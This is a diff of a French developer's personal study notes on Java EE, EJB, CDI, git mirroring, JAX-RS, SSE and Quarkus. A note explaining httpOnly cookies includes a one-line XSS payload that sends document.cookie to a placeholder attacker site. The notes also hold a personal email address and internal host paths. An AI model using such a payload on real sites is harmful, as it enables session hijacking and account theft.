@@ -3,6 +3,12 @@ Hashmap/HashTable
 lock reentrant
 immutable interet car pas de pb de concurrence
 comment eviter transitive
+
+AFAIRE : 
+capitaliser get spring
+lire : C:\Users\ut2sn0\My_IT_Applications\apprentissage\20190716_Kubernetes_Live_Demo_in_SQY.pdf
+comment eviter transitive pb maven
+
 prototype Array
 select innerjoin
 classloader
@@ -747,8 +753,8 @@ github : guitub :  git : gitub : (installable sur mobaxterm:depoxer le plugin da
                  ssh-keygen -t rsa -b 4096 -C "kanailaurent@gmail.com" // generer une paire de clé dans gitbash
                  clip < /c/Users/lduverge/.ssh/id_rsa.pub // copier dans le ... ma cle publique.. et ensuite le copier dans github
                  ssh-add /c/Users/lduverge/.ssh/id_rsa // ajouter (je peux renommer id_rsa comme je veux: toto_rsa par ex) 
-                 eval $(ssh-agent -s) // demarrer le ssh-agent (il se peut qu'il ne soit pas demarré c pour ca.) pour une authentification automatique
-                 ssh-add /c/Users/lduverge/.ssh/id_rsa // ajouter ma paire de clé au ssh agent (je peux renommer id_rsa comme je veux: toto_rsa par ex)
+                 eval $(ssh-agent -s) // utiliser ca si ma cle n'est pas sous .ssh: demarrer le ssh-agent (il se peut qu'il ne soit pas demarré c pour ca.) sert aussi pour une authentification automatique
+                 ssh-add /c/path/vers/ma/cle/prive/toto_rsa // ajouter ma paire de clé au ssh agent (je peux renommer id_rsa comme je veux: toto ou toto_rsa par ex)
           pour definir un proxy: 
                 git config --global http.proxy http://proxyUsername:proxyPassword(echaper par urlEncode si presence de char speciaux)@proxy.server.com(SANS HTTP):port
                 pour dégager le proxy: 
@@ -872,7 +878,25 @@ github : guitub :  git : gitub : (installable sur mobaxterm:depoxer le plugin da
                     si il dit "....be overwritten by merge" c'est que quelqun a poste sur le repo des choses qu'il n'aurait pas du. 2 solutions: 1)faire un git clone ailleurs du projet puis git rm fichiersquinauraientpasdusetrouverdanslerepo puis commit et push 2)aller sur le repo et les supprimer
         si j'ai l'erreur cannot stat permission denied au moment d'une manip
                 c'est a chause de windows. il ya un fichier locké par un autre programme. Tout fermer et recommencer
-            
+		pour faire du mirroring automatiquement par un petit script:
+			unrepogitdistant---->monpc---->unautrerepogitdistant 
+					eval $(ssh-agent -s)
+					ssh-add /c/Users/ut2sn0/My_IT_Applications/configs/clepriveegitlabCacib
+					for project in mynews-pwa.git mynews-backend.git mynews-api.git mynews-solution.git mynews-connecteur-60s.git mynews-connecteur-intranet.git mynews-connecteur-twitter.git mynews-connecteur-api.git mynews-connecteur-biographie.git mynews-authentication.git
+					do
+							if [ ! -r ${project} ]
+							then
+									echo "clone $project "
+									git clone --mirror https://gitlab.com/ca-digiteam/mynews/$project # cree un clone de type bare repository en local a partir de ce gitlab
+							fi
+							cd $project
+							echo "mirroring $project from gitlab to gitlabcacib"
+							git remote set-url --push origin svcsvnpr@gitlab.ca.cib:CCI/CIT/DIGITEAM/MyNews/$project # redefini le remote pour les push seulement vers un autre repository
+							git fetch -p origin # fait un fetch de l'origin
+							git push --mirror # push vers la destination mirroire qui est l'autre repository
+							cd ..
+					done
+
 Nativescript :
       generateur d'icones http://nsimage.brosteins.com/
       guide commandes: https://github.com/NativeScript/nativescript-cli#the-commands
@@ -1070,7 +1094,7 @@ gradle: pour tout builder:
       ca build sous \projet\build\libs\springboot-deployment-1.0.0-SNAPSHOT.jar 
 taille des logs dans la console: settings>console>overrideconsolebuffersize
 pom voir arbre des dependances hierarchie > dans la vue maven: clique droit sur projet > show effective pom ATTENTION A RAFRAICHIR refresh dans vue maven sinon la hierarchie est obsolete
-        encore mieux: charger https://plugins.jetbrains.com/plugin/7179-maven-helper et installer le plugin
+        encore mieux: charger https://plugins.jetbrains.com/plugin/7179-maven-helper et installer le plugin: installe le directement depuis settings>plugins>il est là
         permet aussi d'afficher menu contextuel maven run debug dans projets projectst (si inactif  appuyer sur "+" a droite pannel maven)
         dans onglet dependency analyser à gauche on y voit les artifactID:version
 si le pom.xml maven est en erreur: rafraichir refresh dans la vue maven +  faire une mvn:compilation pour le forcer à charger les dependances et montrer les vraies erreurs
@@ -1858,93 +1882,7 @@ pour jouer un fichier audio avec mediaplayer il vaut mieux proceder comme ca:
                                     <moz:SearchForm>http://phare.intra.renault.fr/rse/servlet/phare</moz:SearchForm>
                                     </OpenSearchDescription>
                                     
-ejbs :
-  ejb 2 :
-    http://jmdoudoux.developpez.com/cours/developpons/java/chap-ejb.php#ejb
- ejb :3.0,3.1
-    on utilise les annotation et pour les besoins plus specifiques on ajoute du metadata dans ejb-jar.xml(facultatif en 3.1. Peut etre vide dans 3.0)
-    si pas d'annotations: le container utilise des valeurs par defaut
-  ------------------
-  type            annotation
-  // session bean est le seul ejb qu'on peut appeller remotely
-  SessionBean     @Stateless // n'a pas de donnees de l'interaction avec client c a d: seul un client accède à ce bean à un instant donne, il n'est pas persistent, le bean est un webservice. On peut avoir plusieurs clients qui accedent a ce bean mais c'est pour chacun une relation 1client-1bean (pooled)                                        
-                  @Statefull  // contient des donnees de l'interaction avec le client c a d: thread-safe: il cree autant d'instance indep que de client
-                        //stateless et statefull ne supportent pas d'acces concurents sur un meme bean.
-                  @Singleton // uniquement EJB 3.1: un seul ejb bean pour tout le monde.(tout les clients): cree par le container au demarrage sauf si lazy-loading
-  Message Driver  @MessageDriven // on ne peut le joindre qu'avec des messages à l'interieur du container (du serveur) par des Message Bus
-  JPA Entities    @Entity
-                  @EntityManager
-  ------------------
-  type            annotation
-  SessionBean     @Local ---> l'accès à ces beans ne peut se faire que par d'autres beans du meme EJB (même contexte, même classLoader)
-                  @LocalBean ---> >=EJB 3.1: bean sans interface necessaire.
-                  @Remote ---> Bean de l'EJB peut être accede de l'exterieur de son classLoader   
-                  @WebService
-  Message Driver  @WebService
-  JPA Entities    N/A
-  ------------------
-  type            annotation
-  Container-Managed mode    Le plus utilise: le container s'occupe des Transactions, Roles, Security, Persistence et Entities 
-  Bean-Managed mode         le developpeur doit lui même gerer le reste. Le container gere seul Transatction et Persistence
-  ------------------                                                     
-  LifeCycle des instances d'EJB:
-        N'existe pas
-              V
-        si on fait un appel jndi:lookup à l'ejb ou injection de dependance) 
-              V
-        PostConstruct (pas encore de proxy)
-              V
-        Ready: container cree automatiquement le proxy et les instances d'EJB: Client <---->proxy<---->Instances d'EJB 
-              V        
-        Pre-Removal: a lieu si on arrete le serveur ou on undeploy ou Existe erreur critique ou le client disparait(ne se connecte plus pdt untemps) dans le cas d'un StatefullBean ou si j'appelle une methode du bean qui a en tête l'annotation @Remove
-  -------------------
- import javax.ejb.Local;
- @Local ou @Remote ou @WebService...(name=blah; jndi-path=blih) //(value=pair) est facultatif
- MonBusinessInterface (logique et est accessible par le jndi)
-    //signatures methodes metiers
-        public int add(int a, int b);
-        ...
-@Stateless ou @Statefull ou @Singleton // facultatif (mappedName="monlookupnomdebean")        
- MonBusiness implements MonBusinessInterface // EJB3.1 pas besoin d'implementer: on rajoute juste au dessus de [@Stateless ou @Statefull ou @Singleton]: [@LocalBean ou @Remote ou @WebService] et le container genère l'interface à la volee
- {
-  ca doit etre la seule sous classe de cette interface depuis EJB3.0
-  ...mes methodes implementees...
- }
-//1 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) par injection de dependance 
- public class Main
- {
-  @EJB ou @Ressources (c'est pareil)// injection de dep: le container trouve tout seul grace au nom de ma classe mon bean EJB en cherchant tout seul dans le jndi. // il faut avoir qu'une seul sous classe de cette interface pour que ca marche
-                      // facultatif (name="monlookupnomdebean")
-  static MonInterfaceDeBeanDEJB ejbbean;
-  public static void main(String[] args)
-  {
-     String toto = ejbbean.calcule(4,2);
-  }
-//2 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) remotely avec JNDI 
- public class Main
- {
-  static MonInterfaceDeBeanDEJB ejbbean;
-  public static void main(String[] args)
-  {
-    Context c = new InitialContext();
-    ejbbean = (MonInterfaceDeBeanDEJB) c.lookup("com.path.jndi.MonInterfaceDeBeanDEJB");
-    String toto = ejbbean.calcule(4,2);
-  }
- }
-    String toto = ejbbean.calcule(4,2);
-  }
- } 
-//2 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) remotely avec JNDI 
- public class Main
- {
-  static MonInterfaceDeBeanDEJB ejbbean;
-  public static void main(String[] args)
-  {
-    Context c = new InitialContext();
-    ejbbean = (MonInterfaceDeBeanDEJB) c.lookup("com.path.jndi.MonInterfaceDeBeanDEJB");
-    String toto = ejbbean.calcule(4,2);
-  }
- }
+ 
 jboss : 
 les fichiers compiles et jsp sont sous: C:\jbdevstudio4\jboss-eap\jboss-as\server\default\tmp\
 console jboss: http://localhost:8080/jmx-console/
@@ -2127,10 +2065,11 @@ erreurs codes http: LINKcodesHttp
 302: redirection temporaire. Google n'aimepas
 400: erreur de synthaxe:protocole http non respecte
 401: non authorise (manque login/password): n'a pas encore été authentifé et le navigateur doit maintenant chercher à s'authentifier. Contient dans le header WWW-Authenticate
-403 407: interdit (login/password incorrect) authentification a échoué
+403 : interdit (login/password incorrect) authentification a échoué
 404: page non trouvee
 405: methode http inadaptee: enlever de ma servlet super.doPost(req, resp); pour que ça marche.
 406: mediatype de retour attendu ne correspond pas: exemple attend du json alors que c'est du html qui est retourné (par experience)
+407 : probleme de proxy
 408: timeout
 413 Payload Too Large
 304: le serveur dit que le browser a deja toutes les infos et pas besoin de renvoyer d'autres infos + code 200
@@ -2139,8 +2078,8 @@ erreurs codes http: LINKcodesHttp
 502: Probleme entre un serveur proxy intermediaire et le serveur final: probleme de protocole ou config
 
 
-J2EE : jee : javaee :
-cdi :CDI2.0 pas besoin d'utiliser weld (je crois) lire https://docs.jboss.org/cdi/learn/cdi_2/slides.html
+J2EE : jee : javaee : EE4J : jakartaee : https://github.com/eclipse-ee4j/jakartaee-tutorial-examples et https://github.com/eclipse-ee4j/jakartaee-tutorial
+cdi :CDI2.0 (JSR365) pas besoin d'utiliser weld (je crois) lire https://docs.jboss.org/cdi/learn/cdi_2/slides.html
 CDI1.x besoin de weld
         <dependency>
 			<groupId>org.jboss.weld.se</groupId>
@@ -2149,6 +2088,23 @@ CDI1.x besoin de weld
 		</dependency>
 		
 <!-- pour utiliser les @ : scan les java qui ont :@Named, @Inject
+Cycle de vie du bean: 
+              – @RequestScoped (par defaut)
+              – @SessionScoped
+              – @ApplicationScoped // le bean est utilise pourl es proprietes generales de l'appli: ex: listes deroulantes qu'on voit tout le temps
+                                            @Singleton // peute etre sur classe meme un webservice. attention ne fait pas partie de la spec CDI mais de EJB. Va de paire avec @Startup. utiliser plutot @ApplicationScoped je crois... mais singleton et statup marchent bien.
+                                            @Startup // a mettre sur une classe. s'execute au demarrage ne fait pas partie de la spec CDI mais de EJB
+              – @ViewScoped
+              – @CustomScoped pour que les beans soient stockees dans le FacesContext (qui a une duree de vie plus courte que RequestScope donc FC est plus rapide, bouffe moins de memoire)
+              – @NoneScoped (si c un bean qui est reference par un autre bean qui lui est scoped)
+              >> attention un bean ne peut pas referencer un autre bean si son scope est plus petit que le sien (sauf les @NoneScoped que tous peuvent referencer)
+                  @PostConstruct-->methode s'execute quand le bean est place dans son scope
+                  public void debut() { ... }
+                  @PreDestroy--->methode s'execute quand le bean est retire du scope ou le scope est detruit.
+                  public void fin() { ... }
+          
+          @ApplicationPath("nomdupremierpathUrlDeMonAppli") // sur une classe qui étend javax.ws.rs.core.Application
+          faire des servlets sans web.xml: ajouter en tete de classe qui etend HttpServlet @WebServlet et @MultipartConfig et faire request.getParmeters il parrait que ça marche
 SeContainerInitializer initializer = SeContainerInitializer.newInstance();
 try (SeContainer container = initializer.disableDiscovery().addPackages(App.class).addBeanClasses(MyService.class).initialize()) { pas besoin de beans.xml
     container.select(MyService.class);       |_on l'empeche de scanner auto
@@ -2162,27 +2118,38 @@ try (SeContainer container = initializer.disableDiscovery().initialize()) { cont
                                                                        xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/beans_1_1.xsd"
                                                                        version="1.1"bean-discovery-mode="all">
                                                                 </beans>
-securite:
+		@Pattern(expressionreguliere) // sur un champ d'un bean: pour valider que ce champ quand il est rempli match bien à la regexp.
+		
+securite:(JSR375)
        AFAIRE
        https://javaee.github.io/tutorial/security-api004.html
+       https://javaee.github.io/tutorial/security-intro003.html#BNBXE->https://javaee.github.io/tutorial/security-javaee002.html#GJGDI
 
         @AutoApplySession // si je veux que quand il s'authentifie ca crée une session http
         @LoginToContinue //pour un FORM login seulement: sert à definir loginpage, loginerrorpage etc...
         @RememberMe //Comme le bouton se souvenir de moi (AFAIRE)       
-       HttpAuthenticationMechanism interface role : gère token d'authentification. Une seule classe doit exister par appli. sous classe doit être Bean. Bean automatiquement appelé par le container pour l'authent
+       HttpAuthenticationMechanism interface role: gère token d'authentification. Une seule classe doit exister par appli. sous classe doit être Bean. Bean automatiquement appelé par le container pour l'authent
        |                    |
        MaCustomClasse        BasicAuthenticationMechanismDefinition;FormAuthenticationMechanismDefinition ;CustomFormAuthenticationMechanismDefinition 
-       METHODE Imporatnte : validateRequest() que je dois implémenter Les 2 autres c facultatif
+       METHODE Importante: validateRequest() que je dois implémenter Les 2 autres c facultatif
                               Fait appel à->IdentityStoreHandler(Je peux le reecrire moi même)->fait appel à tous les->
                             
                                    IdentityStore interface ->interagit avec ldap ou database pour authent l'utilisateur. sous classe doit être Bean.
                                    |            |
-                             MaCustomClasse     @LdapIdentityStoreDefinition;@DatabaseIdentityStoreDefinition (besoin implementer PasswordHash affublé en dependent-scoped bean // role: hasher le password pour comparer ce hash au pwd dans la DB) mais autant utiliser l'implement Pbkdf2PasswordHash  qui nous est proposé; RememberMeIdentityStore : renvoi un token longue durée au client. QUand client revient, valide le token(on dirait que ca peut etre utilisé pour oauth)
+                             MaCustomClasse     @LdapIdentityStoreDefinition;@DatabaseIdentityStoreDefinition (besoin implementer PasswordHash affublé en dependent-scoped bean // role: hasher le password pour comparer ce hash au pwd dans la DB) mais autant utiliser l'implement Pbkdf2PasswordHash  qui nous est proposé; RememberMeIdentityStore: renvoi un token longue durée au client. QUand client revient, valide le token(on dirait que ca peut etre utilisé pour oauth)
                             METHODES: CredentialValidationResult**<-validate(Credential);                                           METHODES:initialize(parametres)// est appelé automatiquement avec les parametres défnis dans @DatabaseIdentityStoreDefinition qui sont les hasheurs possibles 
                                         automatiquement appelera                                                                              verify() et generate() pour valider un password ou pour en créer un autre ??
-                                     GroupesDeCettePersonne<-getCallerGroup(CredentialValidationResult**) // peut fonctionner sans la validation ci-dessus pour recuperer les groupes d'un user meme non authentifié à condition que ce user ait : IdentityStorePermission("getGroups") sécurité à implémenter moi meme si j'utilise ma propre custom classe IdentityStore
+                                     GroupesDeCettePersonne<-getCallerGroup(CredentialValidationResult**) // peut fonctionner sans la validation ci-dessus pour recuperer les groupes d'un user meme non authentifié à condition que ce user ait: IdentityStorePermission("getGroups") sécurité à implémenter moi meme si j'utilise ma propre custom classe IdentityStore
                                      Set<VALIDATE et/ou PROVIDE_GROUPS><-validationTypes() // sert à determiner quelle genre de validation fait cet IdentityStore
-                                     priority() // retourne un integer : plus il est petit plus il est prioritaire pour IdentityStoreHandler      
+                                     priority() // retourne un integer: plus il est petit plus il est prioritaire pour IdentityStoreHandler
+       
+       pour securiser une servlet: 
+            @WebServlet("/servlet")
+            @DeclareRoles({ "role1", "role2bar", "kaz" }) //roles renvoyés par la database. peut etre mis sur classe ou methode(override classe alors)
+            @ServletSecurity(@HttpConstraint(rolesAllowed = "foo") ou @HttpMethodConstraint)
+            public class Servlet extends HttpServlet {
+                              
+                
        
 backend 
 du code java pour aller afficher une page html sans rien faire de special
@@ -2194,6 +2161,101 @@ du code java pour aller afficher une page html sans rien faire de special
   getPage("html.docIntrouvable").print(context);
   out.close();
 Pour afficher du html en sortie de servlet ou du texte en sortie de servlet ou n'importe quoi d'autre
+ejbs : ejb :
+ ejb :3.0,3.1
+    on utilise les annotation et pour les besoins plus specifiques on ajoute du metadata dans ejb-jar.xml(facultatif en 3.1. Peut etre vide dans 3.0)
+    si pas d'annotations: le container utilise des valeurs par defaut
+  ------------------
+  type            annotation
+  // session bean est le seul ejb qu'on peut appeller remotely
+  SessionBean     @Stateless // n'a pas de donnees de l'interaction avec client c a d: seul un client accède à ce bean pour une seule tache, il n'est pas persistent, le bean est un webservice. On peut avoir plusieurs clients qui accedent a ce bean mais c'est pour chacun une relation 1client-1bean (pooled)                                        
+appelable par     @Statefull  // contient des donnees de l'interaction avec le client c a d: thread-safe: il cree autant d'instance indep que de client (c'est comme une session)
+un client               //stateless et statefull ne supportent pas d'acces concurents sur un meme bean.
+en local          @Singleton // uniquement EJB 3.1: un seul ejb bean pour tout le monde.(tout les clients): cree par le container au demarrage sauf si lazy-loading
+ou remote         @Local ---> l'accès à ces beans ne peut se faire que par d'autres beans du meme EJB (même contexte, même classLoader)
+                  @LocalBean ---> >=EJB 3.1: bean sans interface necessaire.
+                  @Remote ---> Bean de l'EJB peut être accede de l'exterieur de son classLoader   
+                  @WebService
+  
+  Message Driver  @MessageDriven // on ne peut le joindre qu'avec des messages JMS à l'interieur du container (du serveur) par des Message Bus
+  Message Driver  @WebService
+  JPA Entities    @Entity
+                  @EntityManager
+  JPA Entities    N/A
+  Container-Managed mode    Le plus utilise: le container s'occupe des Transactions, Roles, Security, Persistence et Entities 
+  Bean-Managed mode         le developpeur doit lui même gerer le reste. Le container gere seul Transatction et Persistence
+  ------------------                                                     
+  LifeCycle des instances d'EJB:
+        N'existe pas
+              V
+        si on fait un appel jndi:lookup à l'ejb ou injection de dependance) 
+              V
+        PostConstruct (pas encore de proxy)
+              V
+        Ready: container cree automatiquement le proxy et les instances d'EJB: Client <---->proxy<---->Instances d'EJB 
+              V        
+        Pre-Removal: a lieu si on arrete le serveur ou on undeploy ou Existe erreur critique ou le client disparait(ne se connecte plus pdt untemps) dans le cas d'un StatefullBean ou si j'appelle une methode du bean qui a en tête l'annotation @Remove
+  -------------------
+ import javax.ejb.Local;
+ @Local ou @Remote ou @WebService...(name=blah; jndi-path=blih) //(value=pair) est facultatif
+ MonBusinessInterface (logique et est accessible par le jndi)
+    //signatures methodes metiers
+        public int add(int a, int b);
+        ...
+@Stateless ou @Statefull ou @Singleton // facultatif (mappedName="monlookupnomdebean")        
+ MonBusiness implements MonBusinessInterface // EJB3.1 pas besoin d'implementer: on rajoute juste au dessus de [@Stateless ou @Statefull ou @Singleton]: [@LocalBean ou @Remote ou @WebService] et le container genère l'interface à la volee
+ {
+  ca doit etre la seule sous classe de cette interface depuis EJB3.0
+  ...mes methodes implementees...
+ }
+//1 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) par injection de dependance 
+ public class Main
+ {
+  @EJB ou @Ressources (c'est pareil)// injection de dep: le container trouve tout seul grace au nom de ma classe mon bean EJB en cherchant tout seul dans le jndi. // il faut avoir qu'une seul sous classe de cette interface pour que ca marche
+                      // facultatif (name="monlookupnomdebean")
+  static MonInterfaceDeBeanDEJB ejbbean;
+  public static void main(String[] args)
+  {
+     String toto = ejbbean.calcule(4,2);
+  }
+//2 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) remotely avec JNDI 
+ public class Main
+ {
+  static MonInterfaceDeBeanDEJB ejbbean;
+  public static void main(String[] args)
+  {
+    Context c = new InitialContext();
+    ejbbean = (MonInterfaceDeBeanDEJB) c.lookup("com.path.jndi.MonInterfaceDeBeanDEJB");
+    String toto = ejbbean.calcule(4,2);
+  }
+ }
+    String toto = ejbbean.calcule(4,2);
+  }
+ } 
+//2 appel de mon bean d'ejb (qui est en fait un proxy cree par le container) remotely avec JNDI 
+ public class Main
+ {
+  static MonInterfaceDeBeanDEJB ejbbean;
+  public static void main(String[] args)
+  {
+    Context c = new InitialContext();
+    ejbbean = (MonInterfaceDeBeanDEJB) c.lookup("com.path.jndi.MonInterfaceDeBeanDEJB");
+    String toto = ejbbean.calcule(4,2);
+  }
+ }
+ 
+utilisation:
+CustomerHome home =// Get a reference to the CustomerHome object 
+Customer customer = home.create(new Integer(33));
+Name name = new Name("Richard","Wayne", "Monson-Haefel");
+customer.setName(name);
+Enumeration enumOfCustomers =home.findByZip(55410);
+Customer customer2 =home.findByPrimaryKey(new Integer(33));
+Name name2 = customer2.getName();
+System.out.println(name);// output is "Richard Wayne Monson-Haefel"
+
+ 
+
 freemaker :
       <html>
           <head>
@@ -2382,7 +2444,7 @@ pour recuperer de manière sympa les parametres renvoyes par une page web:
 							}
 						}
 
-  recuperer un cookie a partir du request: affichier la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
+  recuperer un cookie a partir du request: afficher la liste des cookies : (isSecure(): le navigateur n'envoi le cookie dans reseau que si canal est securisé https (seuil "securisé" paramétrable sur le navigateur). (donc si http + secure impossible d'ouvrir session). httpOnly: empecher javascript d'acceder aux cookies LINKcooklskjhh (pirate peut injecter dans champ <img onload="document.location="http://site.pirate?c=document.cookie"); Host-only 
                       Cookie[] cookies = request.getCookies();
                         String cookieName = SAPCookie;
                         String defaultValue = 1;
@@ -2846,6 +2908,7 @@ pour recuperer une variable d'environnement qui est declaree dans web.xml:
 
 microservices :
     bonnes pratiques
+
         dans le cadre de microservices il faut qu'il y ait qun seul entrypoint point de départ de l'histoire et les liens renvoyés par les webservices respectant la norme HATEOAS permettent de savoir quelles autres urls je peux appeler.
 quarkus : def: arc c'est CDI=Contexts and Dependency Injection: https://quarkus.io/guides/cdi-reference.html. quarkus-reasteasy:c'est jaxRS
         creer un nouveau projet from scrash de n'importe où: 
@@ -2882,9 +2945,44 @@ quarkus : def: arc c'est CDI=Contexts and Dependency Injection: https://quarkus.
             si dans un service rest j'ai l'erreur can not access a member of class c'est parce que je ne peux pas convertir en json une classe qui est inner d'une autre classe.       
 
 webservice : webservices : voir LINKSWAGGER 
+
+        -versionning: V.X.Y : Y changements minaures sur le meme webservice. X:si changement majeur faire un autre webservice et ne pas toucher à l'ancien. ceux qui appellent le webservice peuvent basculer en X+1 quand ils veulent. Comme la regle ne pas modifier mais etendre.
+                A___          A___V1.0     A________V1.0
+                    \_V.1.0   B   
+                B_--'             V2.0     B.V2.0---V2.0
+        -mettre DNS clusturisé des webservice: les URL ne sont pas en dur dans les webservices mais dans ce DNS
+        -gérer l'overload par un buffer type kafka:queue qui appani les pics de charges.
+        -dans le cadre de microservices il faut qu'il y ait qun seul entrypoint point de départ de l'histoire et les liens renvoyés par les webservices respectant la norme HATEOAS permettent de savoir quelles autres urls je peux appeler.
+webservice : webservices : voir LINKSWAGGER
+          PRG :
+                    GET: ne modifie jamais l'état du systeme sauf des trucs comme le logs, ne fait que renvoyer data comme un select. always load pages using GET
+                    PUT: ne fait que modifier update un data du système
+                    POST: Fait tout ce que PUT ne fait pas: CREATION. never show pages in response to POST
+                    DELETE: ne fait que supprimer un data du système. Peut etre async. voir LINKcodesHttp 20x 
+                    Navigate from POST to GET using REDIRECT LINKredirwebservice998 //on peut faire comme ca dans un webservice qui a une methode post
+                                  URI go = new URI("https://"+httpRequest.getServerName()+"/app/foryou/denied.html?samlDenied");
+                                  javax.ws.rs.core.Response response = javax.ws.rs.core.Response.seeOther(go).build(); //LINKRedirectwebservice
+                                  return response;
+ 
+
     UDDI est un annuaire des webservices sur internet
 REST : webservice : webservices : client accède à un service à partir d'un URL et recoit en reponse json ou jpg ou plain text ou meme xml etc (meta-data dedans indique quoi) n'est pas forcement du http. Ca peut etre un websocket
 voir exemple de webservice rest sans framework ici: d:\Profiles\lduverge\Desktop\Apprentissage\webservicedemo(attention pour l'entite j'ai pas respecte unclebob)
+                      No dependencies, no migrations.
+                      import javax.ws.rs.GET;
+                      import javax.ws.rs.Path;
+                      import javax.ws.rs.Produces;
+                      import javax.ws.rs.core.MediaType;
+                      @Path("/hello")
+                      public class HelloResource {
+                          @GET
+                          @Produces(MediaType.APPLICATION_JSON)
+                          public Hello hello() {
+                              return new Hello("hello, component");
+                          }
+                      } can be easily accessed from a vanilla WebComponent
+                           
+
 si erreur java.lang.AbstractMethodError: javax.ws.rs.core.UriBuilder.uri(Ljava/lang/String;)Ljavax/ws/rs/core/UriBuilder
       c parce que j'utilise pas les bonnes versions de librairies jersey/tomcat je crois. upgrader
   webservice renvoit une erreur policy? regarder au niveau "Autorisation"
@@ -3184,6 +3282,25 @@ Pour faire un serveur serveur de chat etc... fonctionnement des sockets
 
 eventsource :sse(server-sent-event) autre alternative aux websocket mais ca ne fonctionne que dans un sens : serveur->client: rafraichit en live la page dans une seule requete
     voir https://github.com/mdn/dom-examples/blob/master/server-sent-events/sse.php
+        @Singleton
+        @Path("battements")
+        public class BroadcastsResource{
+          private SseBroadcaster broadcaster;
+          private Sse sse;
+        }
+        @GET
+        @Produces(MediaType.SERVER_SENT_EVENTS)
+        public void register (@Context Sse sse, @Context SseEventSink eventSink){
+            this.sse=sse;
+            if (broadcaster == null){
+              this.broadcaster = sse.newBroadcaster();}
+            }
+             this.broadcaster.register(eventSink);
+        }
+        @Schedule(second = "*/2",minute = "*", hour="*") LINKTimersdkjsq
+        public void beat(){
+          this.broadcaster.broadcast(this.sse.newEvent("time:"+localTime.low(à.toString()))
+        }
     et voir coté javascript sur MDN: EventSource 
 jwebsocket : (Web Socket) faire un chat : 
   declarer  JWEBSOCKET_HOME vers D:\LocalData\p036782\jWebSocket-1.0
@@ -3192,6 +3309,71 @@ jwebsocket : (Web Socket) faire un chat :
    D:\LocalData\p036782\jWebSocket-1.0\bin\jWebSocketServer.bat
    ou 
    java -jar jWebSocketServer-1.0.jar
+
+
+quarkus : def: arc c'est CDI=Contexts and Dependency Injection: https://quarkus.io/guides/cdi-reference.html. quarkus-reasteasy:c'est jaxRS
+        creer un nouveau projet from scrash de n'importe où: 
+        mvn io.quarkus:quarkus-maven-plugin:0.16.1:create -DclassName="org.acme.quickstart.MaClasseWebServiceResource" -Dpath="/urlDeCeWebServiceHelloWorld" 
+                dans le pom, io.rest-assured c'est pour les tests voir LINKtestetresrtest. ATTENTION remplacer la dependance <artifactId>quarkus-resteasy</artifactId> par <artifactId>quarkus-resteasy-jsonb</artifactId> si je veux faire du rest json 
+  mvnw compile quarkus:dev -Ddebug(si je veux debugger)// execute en dev (demarre un serveur http). quarkus:dev c'est pour que le serveur ecoute les changements et s'auto-refresh. Comment? Reponse:Refreshing the browser triggers a scan of the workspace, and if any changes are detected, the Java files are recompiled and the application is redeployed; your request is then serviced by the redeployed application. If there are any issues with compilation or deployment an error page will let you know.
+  mvnw package // recompile et package 2jars. Un executable -runner.jar (executable par "java -jar target/getting-started-1.0-SNAPSHOT-runner.jar") qui demarre le serveur jboss attention les librairies utilisées sont externes dans target/lib voir son MANIFEST.MF. Un autre qui ne contient pas l'embedded serveur 
+  mvnw package -Pnative // recompile et package un binaire executable dans target environnement dépendant donc attention:executable sans besoin de jvm mais fonctionne que sur mon type d'environnement actuel
+    du coup rajouter:-Dnative-image.docker-build=true // je crois qui cree un executable metable dans un container docker (voir le dockerfile  genere par quarkus)
+  docker build -f src/main/docker/Dockerfile.native -t quarkus-quickstart/quickstart // creer l'image docker
+  docker run -i --rm -p 8080:8080 quarkus-quickstart/quickstart // executer dans docker ou kubernetes
+       quarkus :tests:
+            @QuarkusTest // le serveur jboss demarre sur port 8081(modifiable par quarkus.http.test-port dans application.properties) et rest-assured utilise ce port. Toutes les injections se font.
+            public class GreetingResourceTest {
+                @Test
+                public void testHelloEndpoint() {
+                    given() // de rest-assured. SI je veux forcer moi meme l'url alors faire  @TestHTTPResource("/monPath") URL ou String monUrl dans ma classe de test
+                      .when().get("/hello")
+                      .then()
+                         .statusCode(200)
+                         .body(is("hello"));
+                }
+                @Test
+                public void testGreetingEndpoint() {
+                    String uuid = UUID.randomUUID().toString();
+                    given()
+                            .pathParam("name", uuid)  // rempli le {name} ci dessous
+                            .when().get("/hello/hello/{name}")
+                            .then()
+                            .statusCode(200)
+                            .body(is("hello " + uuid + "\n"));
+                            .body("utilisateur.nom", equalTo("jean"),"lotto.winners.winnerId", hasItems(23, 54));//marche meme si c'est du json. permet de valider le json sans avoir à convertir en objet java LINKtestetresrtest
+                }
+            si dans un service rest j'ai l'erreur can not access a member of class c'est parce que je ne peux pas convertir en json une classe qui est inner d'une autre classe.       
+    une classe webservice :(karaf par ex)
+      LINK93029
+            	@Context                   // request et response comme ça sont automatiquement injectes
+            	private HttpServletRequest httpRequest; // attention on dirait que pas possible de faire httpRequest.getParameter("x") si dans la methode en bas j'utilise @FormParam
+            	@Context
+            	HttpServletResponse httpResponse;
+                  @GET ou @POST
+                @Path("/la_suite_de_lurl") ou @Path("/") // facultatif ou @Path("/{a:api/v1/realtimepath|api/v2/apps/{appNameId}/realtimepath") //si j'ai plusieurs multiples urls 
+                public interface ou une classe FeaturesRestService { /// TRES IMPORTANT: la methode doit etre public sinon il ne la voit pas
+                @Path("/lafindelurl") // mettre {monparamdanspath} si on veut utiliser @PathParam("userlogin")String login ci dessous LINK5464  
+               (javax.ws.rs.)@Produces("application/xml") // possible aussi mais à traduire: produces = MediaType.APPLICATION_JSON_VALUE ou MediaType.APPLICATION_STREAM_JSON_VALUE ou MediaType.TEXT_EVENT_STREAM_VALUE ou MediaType.SERVER_SENT_EVENTS
+                  public Collection getFeatures( @FormParam("parametrePost") String unParametre  ) throws Exception;
+                                                  ou 
+                                                      @PathParam("monparamdanspath")String login mais alors attention il faut mettre LINK5464
+                                                      et si besoin
+                                                      @QueryParam("unChampApres?ou&DanslUrl") 
